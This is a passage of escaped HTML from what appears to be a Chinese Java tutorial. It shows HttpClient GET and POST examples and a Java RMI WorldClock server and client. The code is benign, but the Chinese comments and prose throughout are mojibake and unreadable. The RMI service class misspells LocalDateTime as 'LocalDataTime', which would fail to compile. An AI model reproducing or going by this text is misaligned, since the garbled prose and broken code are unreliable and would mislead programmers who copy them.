&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://www.sina.com.cn/&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpRequest&lt;/span> &lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Java HttpClient&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®è¶…æ—¶:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Duration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofSeconds&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®ç‰ˆæœ¬:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">version&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Version&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">HTTP_2&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">httpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BodyHandlers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// HTTPå…è®¸é‡å¤çš„Headerï¼Œå› æ­¤ä¸€ä¸ªHeaderå¯å¯¹åº”å¤šä¸ªValue:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">header&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">keySet&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">header&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">header&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>post&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://www.example.com/login&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;username=bob&amp;amp;password=123456&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpRequest&lt;/span> &lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®è¶…æ—¶:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Duration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofSeconds&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®ç‰ˆæœ¬:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">version&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Version&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">HTTP_2&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ä½¿ç”¨POSTå¹¶è®¾ç½®Body:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">POST&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BodyPublishers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">body&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">httpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BodyHandlers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="rmi">RMI&lt;/h3>
&lt;p>ä¸€ä¸ªJVMä¸­çš„ä»£ç å¯ä»¥é€šè¿‡ç½‘ç»œå®žçŽ°è¿œç¨‹è°ƒç”¨å¦ä¸€ä¸ªJVMçš„æŸä¸ªæ–¹æ³•&lt;/p>
&lt;p>è¦å®žçŽ°RMIï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å¿…é¡»å…±äº«åŒä¸€ä¸ªæŽ¥å£interfaceï¼Œæµ‹è¯•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">WorldClock&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocalDateTime&lt;/span> &lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ­¤æŽ¥å£å¿…é¡»æ´¾ç”Ÿè‡ª&lt;code>java.rmi.Remote&lt;/code>ï¼Œå¹¶åœ¨æ¯ä¸ªæ–¹æ³•å£°æ˜ŽæŠ›å‡º&lt;code>RemoteException&lt;/code>&lt;/p>
&lt;p>ä¸‹ä¸€æ­¥æ˜¯ç¼–å†™æœåŠ¡å™¨çš„å®žçŽ°ç±»ï¼Œå› ä¸ºå®¢æˆ·ç«¯è¯·æ±‚çš„è°ƒç”¨æ–¹æ³•&lt;code>getLocalDateTime()&lt;/code>æœ€ç»ˆä¼šé€šè¿‡è¿™ä¸ªå®žçŽ°ç±»è¿”å›žç»“æžœ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">WorldClockService&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">LocalDataTime&lt;/span> &lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">LocalDataTime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">now&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ZoneId&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">withNano&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>çŽ°åœ¨éœ€è¦é€šè¿‡Java RMIæä¾›çš„ä¸€ç³»åˆ—åº•å±‚æ”¯æŒæŽ¥å£ï¼ŒæŠŠä¸Šé¢ç¼–å†™çš„æœåŠ¡ä»¥RMIçš„å½¢å¼æš´éœ²åœ¨ç½‘ç»œä¸Šï¼Œå®¢æˆ·ç«¯æ‰èƒ½è°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Server&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;create World clock remote service...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å®žä¾‹åŒ–ä¸€ä¸ªWorldClock:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">worldClock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">WorldClockService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å°†æ­¤æœåŠ¡è½¬æ¢ä¸ºè¿œç¨‹æœåŠ¡æŽ¥å£:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">skeleton&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">exportObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">worldClock&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å°†RMIæœåŠ¡æ³¨å†Œåˆ°1099ç«¯å£:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// æ³¨å†Œæ­¤æœåŠ¡ï¼ŒæœåŠ¡åä¸º&amp;#34;WorldClock&amp;#34;:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WorldClock&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">skeleton&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”±äºŽRMIè¦æ±‚æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å…±äº«åŒä¸€ä¸ªæŽ¥å£ï¼Œå› æ­¤æˆ‘ä»¬è¦æŠŠ&lt;code>WorldClock.java&lt;/code>è¿™ä¸ªæŽ¥å£æ–‡ä»¶å¤åˆ¶åˆ°å®¢æˆ·ç«¯ï¼Œç„¶åŽåœ¨å®¢æˆ·ç«¯å®žçŽ°RMIè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">NotBoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è¿žæŽ¥åˆ°æœåŠ¡å™¨localhostï¼Œç«¯å£1099:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// æŸ¥æ‰¾åç§°ä¸º&amp;#34;WorldClock&amp;#34;çš„æœåŠ¡å¹¶å¼ºåˆ¶è½¬åž‹ä¸ºWorldClockæŽ¥å£:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">worldClock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WorldClock&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// æ­£å¸¸è°ƒç”¨æŽ¥å£æ–¹æ³•:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">LocalDateTime&lt;/span> &lt;span style="color:#111">now&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">worldClock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Asia/Shanghai&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// æ‰“å°è°ƒç”¨ç»“æžœ:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">now&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
